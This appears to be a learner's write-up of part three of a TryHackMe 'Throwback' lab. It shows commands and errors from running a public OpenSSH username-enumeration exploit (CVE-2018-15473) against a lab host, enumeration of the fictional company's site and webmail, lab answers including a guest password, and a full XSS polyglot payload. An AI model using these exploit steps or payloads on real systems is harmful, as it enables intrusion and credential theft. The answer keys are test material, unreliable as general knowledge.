# Exploring the Caverns Part Three 

Part three now, but I feeling the momentuum of progression. Plan of attack before attempting to even look to answering questions on the Task 8 Drop-Down is as follows:

CVE-2018-15473 to get as many credientals as possible before SMB enumeration with Enum4linuxand smbmap, exfiltrating share data and credientals. If possible try to get foothold and maintain persistance with couple backdoors(just try to emulate what I atleast read about and tried in various THM rooms).

[CVE-2018-15473](https://nvd.nist.gov/vuln/detail/CVE-2018-15473_) states:  
*"OpenSSH through 7.7 is prone to a user enumeration vulnerability due to not delaying bailout for an invalid authenticating user until after the packet containing the request has been fully parsed, related to auth2-gss.c, auth2-hostbased.c, and auth2-pubkey.c."*

[exploit](https://github.com/Rhynorater/CVE-2018-15473-Exploit)
```bash
python3 sshUsernameEnumExploit.py 
Traceback (most recent call last):
  File "sshUsernameEnumExploit.py", line 33, in <module>
    old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
TypeError: 'property' object is not subscriptable

```
[issue:1](https://github.com/Rhynorater/CVE-2018-15473-Exploit/issues)

Find and replace all instances on \_handler_table with:
```bash
vim sshUsernameEnumExploit.py
:%s/_handler_table/_client_handler_table/gc
# Press a!
```
We then get:
```bash
python3 sshUsernameEnumExploit.py 
usage: sshUsernameEnumExploit.py [-h] [--port PORT] [--threads THREADS]
                                 [--outputFile OUTPUTFILE]
                                 [--outputFormat {list,json,csv}]
                                 (--username USERNAME | --userList USERLIST)
                                 hostname
sshUsernameEnumExploit.py: error: the following arguments are required: hostname
```
Find wordlists for usernames
```bash
root@ip-10-10-207-14:~/CVE-2018-15473-Exploit# locate usernames
/root/Rooms/BreachingAD/task3/usernames.txt
/usr/share/nmap/nselib/data/usernames.lst
/usr/share/wordlists/SecLists/Usernames/cirt-default-usernames.txt
/usr/share/wordlists/SecLists/Usernames/mssql-usernames-nansh0u-guardicore.txt
/usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
/usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames-dup.txt
/usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt
/var/lib/docker/overlay2/2d199c7783384d3e7736d37c79af646abb52d47edade257e9f6d0dd4192156c0/diff/usr/share/nmap/nselib/data/usernames.lst
/var/lib/gems/2.5.0/gems/metasploit-credential-3.0.4/spec/factories/metasploit/credential/blank_usernames.rb
/var/lib/gems/2.5.0/gems/metasploit-credential-3.0.4/spec/factories/metasploit/credential/usernames.rb
```
More Errors:
```bash
root@ip-10-10-207-14:~/CVE-2018-15473-Exploit# python3 sshUsernameEnumExploit.py --port 22 --threads 16 --outputFormat list --outputFile /root/sshoutTBPROD.txt --userList /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt 10.200.102.219
Traceback (most recent call last):
  File "sshUsernameEnumExploit.py", line 204, in <module>
    main()
  File "sshUsernameEnumExploit.py", line 151, in main
    if not checkVulnerable():
  File "sshUsernameEnumExploit.py", line 94, in checkVulnerable
    result = checkUsername(user)
  File "sshUsernameEnumExploit.py", line 82, in checkUsername
    transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
  File "/usr/local/lib/python3.6/dist-packages/paramiko/transport.py", line 1580, in auth_publickey
    return self.auth_handler.wait_for_response(my_event)
  File "/usr/local/lib/python3.6/dist-packages/paramiko/auth_handler.py", line 236, in wait_for_response
    raise e
  File "/usr/local/lib/python3.6/dist-packages/paramiko/transport.py", line 2055, in run
    ptype, m = self.packetizer.read_message()
  File "/usr/local/lib/python3.6/dist-packages/paramiko/packet.py", line 459, in read_message
    header = self.read_all(self.__block_size_in, check_rekey=True)
  File "/usr/local/lib/python3.6/dist-packages/paramiko/packet.py", line 301, in read_all
    x = self.__socket.recv(n)
ConnectionResetError: [Errno 104] Connection reset by peer

```

While this a very meta-room note: after using nuclei on many other THM boxes it seems like this a somewhat unintended path. To get username enumeration, but seeing as I has yet to use this exploit and for the better of script modification and OSCP. I'll give this attempt futher credence at slightly later point, after manual website enumeration. 

## Manual Enumeration

![Intial](Screenshots/Inital.png)

### TB-PROD

Throwback Hacks is a IT Security Company, based out of the UK that like most British people use Latin to sound important and also accept as currency for services in the American Dollar. 

Powered by w3.css

Users 
http://10.200.102.219/#team

Summer Winters - CEO
Jeff Davies - CFO
Hugh Gongo - CTO
Rikka Foxx - Lead Dev

http://10.200.102.219/#contact

 Great Britain
 Phone: +00 151515
 Email: hello@TBHSecurity.com - @TBHSecurity company email 

### TB-EMAIL

http://10.200.102.232/src/webmail.php
Using Guest credentials:

![TBH-Email](Screenshots/TBH-Email.png)

![Inbox-Sent](Screenshots/TBH-Email-Flag.png)

tbhguest@throwback.local - internal email.

![Contacts](Screenshots/Contacts-List.png)

On the contacts tab all the local email addresses are avaliable for a guest user to email. This would present a flaw in the attempt to maintain high stardards of confidentality. This mailing list is goldmine for APT groups and cyber-criminals without phishing. The CEO, CFO,  CTO internal email addresses are exposed.

In the inbox.Sent a "NotAShell.exe" has been sent to 

![Inbox-Sent](Screenshots/Inbox-Sent-Guest1.png)


## THB-FW

pFsense login

![pfSense](Screenshots/pfSenseLogin.png)


## Answers

Who is the CEO of Throwback Hacks? 
```{toggle}
Summers Winters

```
Where is the company located?
```{toggle}
Great Britain
```
What is the guest username on the mail server?
```{toggle}
tbhguest
```
What is the guest password on the mail server?
```{toggle}
WelcomeTBH1!
```

## Finally
I realised that this experience was still quite fenced in given the amount of clickables and user input. And seeing as I have yet to complete the Phishing rooms and that one the advertised parts of this is phishing. Before moving forward I tried:
xxs polyglot:
```js
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

Attempt:
![xxsPoly](Screenshots/xxsPoly-Prod-attempt.png)

Response 
![xxsResp](Screenshots/xxsPoly-Prod-attempt-response..png)

I broke the burp suite browser trying this so had to restart. Maybe something to return too.